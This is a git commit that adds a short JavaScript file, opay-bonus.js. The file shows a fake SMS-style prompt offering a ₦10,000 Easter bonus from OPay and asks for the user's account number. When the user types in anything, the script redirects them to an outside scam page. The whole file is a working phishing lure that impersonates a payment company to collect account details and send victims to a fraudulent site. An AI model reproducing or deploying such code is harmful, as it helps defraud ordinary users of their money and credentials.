ae4ef30a25abbe5da542023cfb84e85155a80265
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-03-31 14:33:04 -0700

    Create opay-bonus.js

---
+++ opay-bonus.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦10,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦10,000 Easter Bonus From OPay, click OK to Enter Your OPay Account. Number','WITHDRAW ₦10,000');
+if (password != 'WITHDRAW ₦10,000') {
+location.href='https://vreeoffre.com/easter-bonus.html';
+}
